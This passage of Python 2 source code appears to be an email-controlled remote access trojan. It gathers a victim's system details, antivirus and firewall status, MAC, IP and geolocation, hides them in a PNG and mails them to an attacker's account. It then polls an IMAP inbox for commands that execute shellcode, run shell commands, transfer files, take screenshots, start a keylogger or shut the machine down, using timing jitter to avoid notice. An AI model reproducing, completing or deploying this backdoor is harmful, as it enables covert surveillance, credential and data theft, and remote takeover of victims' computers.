    EnumWindows(EnumWindowsProc(foreach_window), 0)
     
    return titles


class sendEmail(threading.Thread):

    def __init__(self, text, jobid='', attachment=[], checkin=False):
        threading.Thread.__init__(self)
        self.text = text
        self.jobid = jobid
        self.attachment = attachment
        self.checkin = checkin
        self.daemon = True
        self.start()

    def run(self):
        sub_header = sysInfo.UniqueID
        if self.jobid:
            sub_header = 'dmp:{}:{}'.format(sysInfo.UniqueID, self.jobid)
        elif self.checkin:
            sub_header = 'hereiam:{}'.format(sysInfo.UniqueID)
        # print "run test1"
        msg = MIMEMultipart()
        msg['From'] = sub_header
        msg['To'] = gmail_user
        msg['Subject'] = sub_header
        # print "run test2"
        # message_content = infoSec.Encrypt(json.dumps({
        #           'fgwindow': detectForgroundWindows(),
        #           'user': '{0}@{1}'.format(sysInfo.User, sysInfo.PCName),
        #           'arch': sysInfo.Architecture,
        #           'os': sysInfo.WinVer,
        #           'cpu': sysInfo.CPU,
        #           'gpu': sysInfo.GPU,
        #           'motherboard': sysInfo.Motherboard,
        #           'isAdmin': sysInfo.isAdmin,
        #           'chassistype': sysInfo.ChassisType,
        #           'totalram': sysInfo.TotalRam,
        #           'bios': sysInfo.Bios,
        #           'pid': sysInfo.PID,
        #           'mac': sysInfo.MAC,
        #           'ipv4': sysInfo.IPv4,
        #           'av': sysInfo.Antivirus,
        #           'firewall': sysInfo.Firewall,
        #           'antispyware': sysInfo.Antispyware,
        #           'geolocation': sysInfo.Geolocation,
        #           'tag': TAG,
        #           'version': VERSION,
        #           'msg': self.text
        #   }))
        message_content = json.dumps({
            'fgwindow': detectForgroundWindows(),
            'user': '{0}@{1}'.format(sysInfo.User, sysInfo.PCName),
            'arch': sysInfo.Architecture,
            'os': sysInfo.WinVer,
            'cpu': sysInfo.CPU,
            'gpu': sysInfo.GPU,
            'motherboard': sysInfo.Motherboard,
            'isAdmin': sysInfo.isAdmin,
            'chassistype': sysInfo.ChassisType,
            'totalram': sysInfo.TotalRam,
            'bios': sysInfo.Bios,
            'pid': sysInfo.PID,
            'mac': sysInfo.MAC,
            'ipv4': sysInfo.IPv4,
            'av': sysInfo.Antivirus,
            'firewall': sysInfo.Firewall,
            'antispyware': sysInfo.Antispyware,
            'geolocation': sysInfo.Geolocation,
            'tag': TAG,
            'version': VERSION,
            'msg': self.text
        })
        # print "run test3"
        filename = "Information.txt"
        with open(filename, 'w') as file:
            file.write(message_content)
        payload = "Information.txt"
        input = "CC.png"
        output = "After_CC.png"
        png_encode(payload, input, output)
        # print "run test4"
        self.attachment.append(output)
        #msg.attach(MIMEText(str(message_content)))
        for attach in self.attachment:
            if os.path.exists(attach) == True:
                part = MIMEBase('application', 'octet-stream')
                part.set_payload(open(attach, 'rb').read())
                Encoders.encode_base64(part)
                part.add_header('Content-Disposition', 'attachment; filename="{}"'.format(os.path.basename(attach)))
                msg.attach(part)
        # print self.attachment
        # print 111
        while True:
            try:
                # mailServer = SMTP()
                # mailServer.connect(server, server_port)
                mailServer = smtplib.SMTP(server)
                # mailServer.starttls()
                mailServer.login(gmail_user,gmail_pwd)
                mailServer.login(gmail_user,gmail_pwd)
                mailServer.sendmail(gmail_user, gmail_user, msg.as_string())
                mailServer.quit()
                break
            except Exception as e:
                #if verbose == True: print_exc()
                time.sleep(10)


def checkJobs():
    #Here we check the inbox for queued jobs, parse them and start a thread
    #EMAIL_KNOCK_TIMEOUT = 60  # seconds - check for new commands/jobs every EMAIL_KNOCK_TIMEOUT seconds
    #JITTER = 100
    while True:

        try:
            c = imaplib.IMAP4_SSL(imap_server)
            c.login(gmail_user, gmail_pwd)


            imap_id = ("name", "lucky", "version", "v1", "vendor", "luckyxy")
            typ0, data = c.xatom('ID', '("' + '" "'.join(imap_id) + '")')
            # print('typ', typ0, 'data', data)
            c.select("INBOX")
            # print('gdog:{}:').format(sysInfo.UniqueID)
            # typ, id_list = c.uid('search', None, "(UNSEEN SUBJECT 'gdog:{}:')".format(sysInfo.UniqueID))
            typ, id_list = c.uid('search', None, "(UNSEEN)")
            # typ, id_list = c.uid('search', None, "(UNSEEN SUBJECT 1)")
            # typ, id_list = c.search(None, 'SUBJECT "gdog"'.encode('utf-8'))
            print 'sysInfo.UniqueID', sysInfo.UniqueID
            print 'typ', typ
            print 'id_list:', id_list

            newid_list = []
            for msg_id in id_list[0].split():
                msg_data = c.uid('fetch', msg_id, '(RFC822)')
                # print msg_data
                msg = MessageParser(msg_data)
                # print msg
                head = msg.subject.split(':')[0]
                botid = msg.subject.split(':')[1]
                print(msg_id,head,botid)
                if botid == sysInfo.UniqueID and head =='gdog':
                    newid_list.append(msg_id)
                else:
                    c.uid("STORE", msg_id, '-FLAGS', '(\\SEEN)')

            print 'newid_list:', newid_list
            if not newid_list:
                print "列表为空，等待一分钟"
                c.logout()
            else:
                for msg_id in newid_list:
                    # logging.debug("[checkJobs] parsing message with uid: {}".format(msg_id))
                    msg_data = c.uid('fetch', msg_id, '(RFC822)')
                    # print '--------------------msg_data--------------------'
                    # print msg_data
                    msg = MessageParser(msg_data)
                    # print '11111'
                    jobid = msg.subject.split(':')[2]

                    if msg.dict:
                        cmd = msg.dict['cmd'].lower()
                        arg = msg.dict['arg']
                        print 'cmd:',cmd

                    #logging.debug("[checkJobs] CMD: {} JOBID: {}".format(cmd, jobid))

                        if cmd == 'execshellcode':
                            execShellcode(arg, jobid)

                        elif cmd == 'download':
                            download(jobid, arg)

                        elif cmd == 'downloadfromurl':
                            downloadfromurl(jobid, arg)

                        elif cmd == 'upload':
                            upload(jobid, arg, msg.attachment)

                        elif cmd == 'screenshot':
                            screenshot(jobid)

                        elif cmd == 'tasks':
                            tasks(jobid)

                        elif cmd == 'services':
                            services(jobid)

                        elif cmd == 'users':
                            users(jobid)

                        elif cmd == 'devices':
                            devices(jobid)

                        elif cmd == 'cmd':
                            execCmd(arg, jobid)

                        elif cmd == 'visitwebsite':
                            visitwebsite(arg, jobid)

                        elif cmd == 'message':
                            message(arg, jobid)

                        elif cmd == 'lockscreen':
                            lockScreen(jobid)

                        elif cmd == 'shutdown':
                            shutdown(jobid)

                        elif cmd == 'restart':
                            restart(jobid)

                        elif cmd == 'logoff':
                            logoff(jobid)

                        elif cmd == 'startkeylogger':
                            keylogger.exit = False
                            keylogger(jobid)

                        elif cmd == 'stopkeylogger':
                            keylogger.exit = True

                        elif cmd == 'forcecheckin':
                            sendEmail("Host checking in as requested", checkin=True)

                        elif cmd == 'email_check':
                            email_check(arg, jobid)
                            #EMAIL_KNOCK_TIMEOUT = int(arg)
                            sendEmail("Email Checking changed too: %s seconds" % str(arg), checkin=True)

                        elif cmd == 'jitter':

                            jitter(arg, jobid)
                            #JITTER = int(arg)
                            sendEmail("JITTER UPDATED too: %s seconds" % str(arg), checkin=True)


                        else:
                            raise NotImplementedError

                c.logout()


            if JITTER != 100:
                JITTER_HIGH =((EMAIL_KNOCK_TIMEOUT * JITTER) /100.0) * 3
                JITTER_LOW = (EMAIL_KNOCK_TIMEOUT * JITTER) /100.0

                time.sleep(random.randrange(JITTER_LOW, JITTER_HIGH))
            else:
                time.sleep(EMAIL_KNOCK_TIMEOUT)

        
        except Exception as e:
            #logging.debug(format_exc())
            print(e.message)
            time.sleep(EMAIL_KNOCK_TIMEOUT)


if __name__ == '__main__':
    hello = sendEmail("Welcome!! :D", checkin=True)
    hello.attachment=[]
    try:
        checkJobs()
    except KeyboardInterrupt:
        pass
    
